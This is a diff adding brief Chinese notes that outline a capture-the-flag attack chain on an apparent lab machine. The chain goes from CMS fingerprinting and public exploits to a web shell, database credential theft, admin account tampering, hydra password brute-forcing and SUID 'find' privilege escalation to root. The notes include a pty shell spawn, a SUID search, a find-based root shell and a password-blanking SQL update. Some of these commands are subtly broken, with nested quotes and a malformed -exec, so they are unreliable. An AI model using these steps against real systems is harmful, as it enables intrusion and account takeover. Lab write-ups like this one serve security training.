@@ -1,0 +1,18 @@
+cms指纹信息 -> 搜索公开的漏洞信息 -> 手工验证 or msf搜索最新exp 
+-> 获取到shell www-data权限(flag1) -> 通过配置文件找到mysql的密码(flag2)  
+-> 添加/修改网站后台账户 -> 登录网站后台(flag3)
+ -> 观察/etc/passwd文件发现flag4用户 -> hydra暴破得到flag4密码 -> /home目录下发现flag4
+-> 通过拥有root权限的命令提权 -> /root目录下发现flag5
+
+msf获取shell后通过python模拟交互shell
+python -c "import pty;pty.spawn("/bin/bash")"
+
+寻找root权限的命令
+find / -perm -u=s -type f 2>/dev/null
+
+通过find提权
+touch test
+find / -name test -type f -exec="/bin/sh" \; 
+
+修改数据库表中的数据
+update users set pass="" where name=""
